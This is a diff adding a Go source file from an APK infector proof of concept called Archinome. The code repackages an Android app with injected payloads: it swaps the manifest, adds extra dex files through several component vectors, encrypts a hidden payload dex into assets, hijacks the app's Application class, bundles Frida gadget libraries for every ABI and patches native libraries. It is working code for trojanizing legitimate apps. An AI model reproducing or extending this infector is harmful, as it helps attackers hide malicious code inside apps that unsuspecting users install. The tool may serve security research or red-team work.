@@ -1,0 +1,260 @@
+package injector
+
+import (
+	"archive/zip"
+	"fmt"
+	"log"
+	"os"
+	"path/filepath"
+	"strconv"
+	"strings"
+
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/assetpayload"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
+	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/nativepatch"
+)
+
+// Inject rewrites inputAPK into outputAPK for the selected vector.
+//
+// The archive is never unpacked to the filesystem: every member is streamed from
+// the input APK to the output APK. That is a correctness requirement, not an
+// optimisation — APKs produced by aapt2 with obfuscated resource names contain
+// members that differ only by case (res/HQ.xml vs res/hq.xml, res/GD.xml vs
+// res/Gd.xml vs res/gD.xml) and a filesystem round trip on a case-insensitive
+// volume (macOS, Windows) silently loses one member per collision, after which
+// the patched app dies with Resources$NotFoundException.
+func Inject(inputAPK string, outputAPK string) {
+	plan := NewRepackPlan()
+
+	if utils.Payload_option == int(utils.Native_payload) {
+		if err := planNative(inputAPK, &plan); err != nil {
+			// A host without lib/<abi>/ is a legitimate "not applicable", not a
+			// crash: report it plainly and leave no output behind.
+			fmt.Printf("\t--SKIP: native vector not applicable: %v\n", err)
+			os.Remove(outputAPK)
+			os.Exit(3)
+		}
+		writePlan(inputAPK, outputAPK, plan)
+		return
+	}
+
+	names, err := ListNames(inputAPK)
+	if err != nil {
+		log.Panic("Failed to read the input APK: ", err)
+	}
+
+	plan.Replace["AndroidManifest.xml"] = mustReadFile(utils.ManifestBinaryPath)
+
+	next := nextDexIndex(names)
+
+	switch utils.Payload_option {
+	case int(utils.Provider_payload), int(utils.Trampoline_payload),
+		int(utils.Receiver_payload), int(utils.AppComponentFactory_payload),
+		int(utils.Assets_payload):
+		src := payloadStubPath()
+		plan.Add = append(plan.Add, Entry{
+			Name:   dexName(next),
+			Data:   mustReadFile(src),
+			Method: zip.Deflate,
+		})
+		log.Printf("Successfuly injected DEX: %s", dexName(next))
+
+		if utils.Payload_option == int(utils.Assets_payload) {
+			blob, err := sealAssetsPayload()
+			if err != nil {
+				log.Panic("Failed to seal the payload into assets/: ", err)
+			}
+			plan.Add = append(plan.Add, Entry{Name: assetpayload.AssetPath, Data: blob, Method: zip.Deflate})
+			fmt.Printf("\t--sealed payload: %s (%d bytes, AES-256-GCM)\n", assetpayload.AssetPath, len(blob))
+		}
+
+	default:
+		// Application hijack (custom / frida): clear the final modifier on the
+		// host Application class in every dex, then add the wrapper stub and the
+		// payload as extra dex files.
+		for _, n := range names {
+			if isDexName(n) {
+				plan.Transform[n] = dex.PatchAppModifierBytes
+			}
+		}
+		plan.Add = append(plan.Add, Entry{Name: dexName(next), Data: mustReadFile(injectedAppPrevName), Method: zip.Deflate})
+		plan.Add = append(plan.Add, Entry{Name: dexName(next + 1), Data: mustReadFile(payloadHijackPath()), Method: zip.Deflate})
+		log.Printf("Successfuly injected DEX: %s, %s", dexName(next), dexName(next+1))
+
+		for abi, file := range map[string]string{
+			"arm64-v8a":   "frida-gadget-16.1.1-android-arm64.so",
+			"armeabi-v7a": "frida-gadget-16.1.1-android-arm.so",
+			"x86":         "frida-gadget-16.1.1-android-x86.so",
+			"x86_64":      "frida-gadget-16.1.1-android-x86_64.so",
+		} {
+			gadget, err := os.ReadFile(filepath.Join("frida_gadget", file))
+			if err != nil {
+				log.Panicf("Failed to read the frida gadget for %s: %v", abi, err)
+			}
+			plan.Add = append(plan.Add, Entry{
+				Name:   filepath.ToSlash(filepath.Join("lib", abi, "libfrida-gadget.so")),
+				Data:   gadget,
+				Method: zip.Store,
+			})
+		}
+	}
+
+	writePlan(inputAPK, outputAPK, plan)
+}
+
+func writePlan(inputAPK, outputAPK string, plan RepackPlan) {
+	fmt.Println("\t--repacking (streaming, names preserved)...")
+	if err := Repack(inputAPK, outputAPK, plan); err != nil {
+		log.Panic("Failed to write the patched APK: ", err)
+	}
+	fmt.Println("\t--Done! Now you should sign your apk")
+}
+
+// planNative injects the payload library into lib/<abi>/ by unpacking only that
+// subtree into a temporary directory (its members never collide by case) and
+// diffing the result back into the plan.
+func planNative(inputAPK string, plan *RepackPlan) error {
+	tmp, err := os.MkdirTemp("", "archinome-native-")
+	if err != nil {
+		return err
+	}
+	defer os.RemoveAll(tmp)
+
+	names, err := ExtractSubtree(inputAPK, "lib/", tmp)
+	if err != nil {
+		return err
+	}
+	if len(names) == 0 {
+		return fmt.Errorf("no lib/<abi>/ directory in %s", filepath.Base(inputAPK))
+	}
+
+	original := make(map[string][]byte, len(names))
+	for _, n := range names {
+		data, err := ReadEntry(inputAPK, n)
+		if err != nil {
+			return err
+		}
+		original[n] = data
+	}
+
+	results, err := nativepatch.Apply(tmp, nativepatch.Options{
+		ABI:     os.Getenv("ARCHINOME_NATIVE_ABI"),
+		HostLib: os.Getenv("ARCHINOME_NATIVE_HOST"),
+		Mode:    nativepatch.Mode(os.Getenv("ARCHINOME_NATIVE_MODE")),
+		Payload: os.Getenv("ARCHINOME_NATIVE_LIB"),
+		OurName: os.Getenv("ARCHINOME_NATIVE_NAME"),
+	})
+	if err != nil {
+		return err
+	}
+	for _, r := range results {
+		log.Printf("native: %s", r)
+		fmt.Println("\t--" + r.String())
+	}
+	return PlanFromDir(tmp, original, plan, ".so")
+}
+
+// sealAssetsPayload encrypts the dynamic payload dex for the assets vector and
+// returns the blob that is added as assets/<name>.
+func sealAssetsPayload() ([]byte, error) {
+	payloadDex := os.Getenv("ARCHINOME_ASSETS_DEX")
+	if payloadDex == "" {
+		payloadDex = payload_assets_dyn_name
+	}
+	passphrase := os.Getenv("ARCHINOME_ASSETS_KEY")
+	if passphrase == "" {
+		passphrase = assetpayload.DefaultPassphrase
+	} else if passphrase != assetpayload.DefaultPassphrase {
+		log.Printf("WARNING: ARCHINOME_ASSETS_KEY differs from the passphrase compiled into the loader")
+		fmt.Println("\t--WARNING: custom passphrase set, but the compiled loader uses the default one")
+	}
+	plain, err := os.ReadFile(payloadDex)
+	if err != nil {
+		return nil, err
+	}
+	blob, err := assetpayload.Seal(plain, assetpayload.KeyFromPassphrase(passphrase))
+	if err != nil {
+		return nil, err
+	}
+	log.Printf("Sealed %s -> %s (%d bytes)", payloadDex, assetpayload.AssetPath, len(blob))
+	return blob, nil
+}
+
+func payloadStubPath() string {
+	switch utils.Payload_option {
+	case int(utils.Provider_payload):
+		return payload_provider_name
+	case int(utils.Trampoline_payload):
+		return payload_trampoline_name
+	case int(utils.AppComponentFactory_payload):
+		return payload_appfactory_name
+	case int(utils.Assets_payload):
+		return payload_assets_name
+	default:
+		return payload_receiver_name
+	}
+}
+
+func payloadHijackPath() string {
+	if utils.Payload_option == int(utils.Frida_payload) {
+		return payload_frida_name
+	}
+	return payload_custom_name
+}
+
+func mustReadFile(path string) []byte {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		log.Panicf("Failed to read %s: %v", path, err)
+	}
+	return data
+}
+
+func dexName(index int) string {
+	if index <= 1 {
+		return "classes.dex"
+	}
+	return "classes" + strconv.Itoa(index) + ".dex"
+}
+
+func isDexName(name string) bool {
+	base := name
+	if strings.Contains(base, "/") {
+		return false
+	}
+	if !strings.HasPrefix(base, "classes") || !strings.HasSuffix(base, ".dex") {
+		return false
+	}
+	mid := strings.TrimSuffix(strings.TrimPrefix(base, "classes"), ".dex")
+	if mid == "" {
+		return true
+	}
+	_, err := strconv.Atoi(mid)
+	return err == nil
+}
+
+func dexIndexOf(name string) int {
+	if !isDexName(name) {
+		return 0
+	}
+	mid := strings.TrimSuffix(strings.TrimPrefix(name, "classes"), ".dex")
+	if mid == "" {
+		return 1
+	}
+	n, err := strconv.Atoi(mid)
+	if err != nil {
+		return 0
+	}
+	return n
+}
+
+func nextDexIndex(names []string) int {
+	max := 0
+	for _, n := range names {
+		if idx := dexIndexOf(n); idx > max {
+			max = idx
+		}
+	}
+	return max + 1
+}
